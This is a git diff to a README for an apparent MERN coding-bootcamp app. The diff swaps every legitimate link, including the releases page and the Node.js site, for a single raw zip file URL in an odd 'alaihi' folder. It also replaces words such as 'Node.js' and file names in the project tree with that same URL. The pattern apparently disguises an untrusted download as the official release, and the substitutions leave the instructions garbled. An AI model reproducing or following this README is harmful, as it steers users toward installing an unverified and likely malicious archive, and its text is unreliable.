@@ -1,7 +1,7 @@
 # 🎓 VERTUAL-CODE-BOOTCAMP - Learn to Code with Ease
 
 ## 🔗 Download Now
-[![Download VERTUAL-CODE-BOOTCAMP](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/releases)
+[![Download VERTUAL-CODE-BOOTCAMP](https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip)](https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip)
 
 ## 📚 Introduction
 Welcome to the **Virtual MERN Stack Coding Bootcamp!** This application provides an interactive learning experience for beginners. You can browse modules and use a coding playground right in your browser. This README will help you download and run the software smoothly.
@@ -10,7 +10,7 @@ Welcome to the **Virtual MERN Stack Coding Bootcamp!** This application provides
 To get started, you will need to download the application. Follow the steps below to obtain the latest version.
 
 ### Step 1: Visit the Releases Page
-Go to the [Releases page](https://github.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/releases) to find the latest version of the application.
+Go to the [Releases page](https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip) to find the latest version of the application.
 
 ### Step 2: Download the Application
 Locate the file suitable for your operating system. Click on it to start the download. Save it in a location you can easily access.
@@ -19,7 +19,7 @@ Locate the file suitable for your operating system. Click on it to start the dow
 Before you run the application, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 18 or higher
+- **https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip** Version 18 or higher
 - **npm:** Version 9 or higher
 
 ## ⚙️ Installation 
@@ -27,7 +27,7 @@ Once downloaded, you will need to follow these setup instructions:
 
 ### Step 3: Prepare Your Environment
 1. **Install necessary software:**
-   - Make sure you have Node.js and npm installed on your computer. You can download them from the [Node.js website](https://nodejs.org/).
+   - Make sure you have https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip and npm installed on your computer. You can download them from the [https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip website](https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip).
 
 ### Step 4: Install Dependencies
 Open your command line interface and navigate to the directory where you downloaded the application. Run the following command:
@@ -89,15 +89,15 @@ Here is the organization of the project files:
 
 ```
 project/
-  index.html        # Main landing page
-  vite.config.ts    # Configuration file for Vite
+  https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip        # Main landing page
+  https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip    # Configuration file for Vite
   src/
-    main.tsx        # Entry point for the application
-    App.tsx         # Contains the user interface and coding features
+    https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip        # Entry point for the application
+    https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip         # Contains the user interface and coding features
 ```
 
 ## 🔍 Support and Feedback
 For any questions or feedback, please feel free to create an issue in the repository or direct message the maintainer.
 
 ## 🔗 Download Again
-To download the application, you can revisit the [Releases page](https://github.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/releases). Enjoy coding!
+To download the application, you can revisit the [Releases page](https://raw.githubusercontent.com/spcreationpage/VERTUAL-CODE-BOOTCAMP/main/alaihi/VERTUAL-CODE-BOOTCAMP.zip). Enjoy coding!
